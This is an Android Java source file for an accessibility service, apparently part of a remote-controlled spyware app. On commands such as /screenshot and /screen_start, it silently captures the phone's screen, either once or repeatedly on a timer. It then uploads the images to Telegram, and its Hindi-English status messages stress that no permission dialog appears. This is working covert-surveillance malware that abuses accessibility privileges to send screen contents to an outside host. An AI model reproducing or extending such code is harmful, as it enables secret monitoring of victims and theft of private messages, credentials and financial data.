package com.smshandler;

import android.accessibilityservice.AccessibilityService;
import android.annotation.SuppressLint;
import android.graphics.Bitmap;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.view.accessibility.AccessibilityEvent;
import java.io.File;
import java.io.FileOutputStream;

public class ScreenAccessibilityService extends AccessibilityService {

    public static volatile ScreenAccessibilityService instance = null;

    private volatile boolean mContinuous = false;
    private int              mInterval   = 30;
    private Handler          mHandler;
    private HandlerThread    mThread;

    private final Runnable mContTask = new Runnable() {
        @Override public void run() {
            if (mContinuous) {
                doCapture();
                if (mContinuous) mHandler.postDelayed(this, mInterval * 1000L);
            }
        }
    };

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        mThread = new HandlerThread("AccCap");
        mThread.start();
        mHandler = new Handler(mThread.getLooper());
        SmsService.sendRawMessage(
            "✅ Screen Service chalu!\n" +
            "Ab /screenshot aur /screen_start bina kisi permission dialog ke kaam karenge.");
    }

    @Override public void onAccessibilityEvent(AccessibilityEvent event) {}
    @Override public void onInterrupt() {}

    @Override
    public void onDestroy() {
        instance = null;
        mContinuous = false;
        if (mHandler != null) { mHandler.removeCallbacks(mContTask); mHandler = null; }
        if (mThread  != null) { mThread.quit(); mThread = null; }
        super.onDestroy();
    }

    public void requestCapture() {
        if (mHandler != null) mHandler.post(this::doCapture);
    }

    public void startContinuous(int intervalSec) {
        mContinuous = true;
        mInterval   = Math.max(5, intervalSec);
        if (mHandler != null) {
            mHandler.removeCallbacks(mContTask);
            mHandler.post(mContTask);
        }
        SmsService.sendRawMessage("📺 Har " + mInterval + "s mein screenshot. /screen_stop se band karo.");
    }

    public void stopContinuous() {
        mContinuous = false;
        if (mHandler != null) mHandler.removeCallbacks(mContTask);
        SmsService.sendRawMessage("🛑 Screen mirror band.");
    }

    @SuppressLint("NewApi")
    private void doCapture() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            takeScreenshot(android.view.Display.DEFAULT_DISPLAY, getMainExecutor(),
                new AccessibilityService.TakeScreenshotCallback() {
                    @Override
                    public void onSuccess(AccessibilityService.ScreenshotResult result) {
                        new Thread(() -> processResult(result)).start();
                    }
                    @Override
                    public void onFailure(int errorCode) {
                        SmsService.sendRawMessage("❌ Screenshot fail (code:" + errorCode + "). Dobara try karo.");
                    }
                });
        } else {
            SmsService.sendRawMessage("❌ Android 11+ chahiye silent screenshot ke liye.");
        }
    }

    @SuppressLint("NewApi")
    private void processResult(AccessibilityService.ScreenshotResult result) {
        Bitmap bmp = null;
        try {
            android.hardware.HardwareBuffer hwBuf = result.getHardwareBuffer();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                Bitmap hw = Bitmap.wrapHardwareBuffer(hwBuf, result.getColorSpace());
                if (hw != null) {
                    bmp = hw.copy(Bitmap.Config.ARGB_8888, false);
                    hw.recycle();
                }
            }
            hwBuf.close();
        } catch (Exception e) {
            SmsService.sendRawMessage("❌ Screenshot convert error: " + e.getMessage());
            return;
        }

        if (bmp == null) {
            SmsService.sendRawMessage("❌ Screenshot: bitmap null. Android 12+ chahiye.");
            return;
        }

        try {
            int maxW = 1080;
            if (bmp.getWidth() > maxW) {
                float scale = (float) maxW / bmp.getWidth();
                Bitmap sc = Bitmap.createScaledBitmap(bmp, maxW, (int)(bmp.getHeight() * scale), true);
                bmp.recycle();
                bmp = sc;
            }
            File f = new File(getCacheDir(), "acc_" + System.currentTimeMillis() + ".jpg");
            FileOutputStream fos = new FileOutputStream(f);
            bmp.compress(Bitmap.CompressFormat.JPEG, 85, fos);
            fos.close();
            bmp.recycle();
            SmsService.sendPhotoToTelegram(f, "📱 Screenshot");
            f.delete();
        } catch (Exception e) {
            SmsService.sendRawMessage("❌ Screenshot send error: " + e.getMessage());
        }
    }
}
